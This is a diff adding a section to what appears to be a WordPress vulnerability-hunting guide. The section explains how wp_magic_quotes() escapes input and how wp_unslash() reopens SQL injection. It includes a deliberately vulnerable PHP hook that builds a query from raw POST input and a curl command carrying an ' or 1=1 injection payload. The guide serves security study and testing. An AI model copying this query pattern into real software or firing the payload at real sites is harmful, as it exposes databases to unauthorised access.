@@ -3430,6 +3430,51 @@ function load_questions(){
 curl [url]/wp-admin/admin-ajax.php?action=load_questions&quiz_id=1 -H "Cookie: question_ids_1=[point_of_injection]"
 ```
 
+-------------
+
+### Magic Quotes
+
+--------------
+
+- Magic Quotes is/was a feature in PHP designed to automatically escape certain characters in user input to prevent SQL injection (SQLi) attacks. Specifically, it would escape single quotes (’), double quotes (”), backslashes (), and NULL characters by automatically adding backslashes before them. This was done to protect against common vulnerabilities like SQL injection, where an attacker might try to insert malicious SQL code into a query.It was optional for PHP but it is disabled. Why we are mentioning it here? It still lives in WordPress via `wp_magic_quotes()`.
+- As mentioned on that page, it is a private function so developers don’t need to implement it. If any code is executed inside WordPress hooks, inputs ($_GET, $_POST, $_COOKIE, and $_SERVER) will go through the add_magic_quotes() which will be sanitized by `addslashes()`.So even a super simple vulnerable-looking code like `select * from users where '$injection_here';` will be escaped and turn into something like `SELECT * FROM users where '\'testpayload';` inside a WordPress hook and you will not be able to exploit it in almost all scenarios.
+- It will only exploitable if the `wp_unslash()` function is used to remove all slashes.Vulnerable code-:
+
+```php
+add_action('init', function() {
+    $input = wp_unslash($_POST['input']);
+    global $wpdb;
+    $query = "SELECT * FROM users WHERE name = '$input'";
+    $result = $wpdb->get_results($query);
+    // Display the result
+    if ($result) {
+        foreach ($result as $row) {
+            echo "User: " . esc_html($row->name);
+        }
+    }
+});
+```
+
+- Exploting it-:
+
+```bash
+curl [url]/ -d "input=' or 1=1--+ "
+```
+
+------------------
+
+### Reference for all WP vulns
+
+------------------
+
+- [Patchstack](https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#introduction)
+
+-----------------
+
+
+
+
+
 
 
 
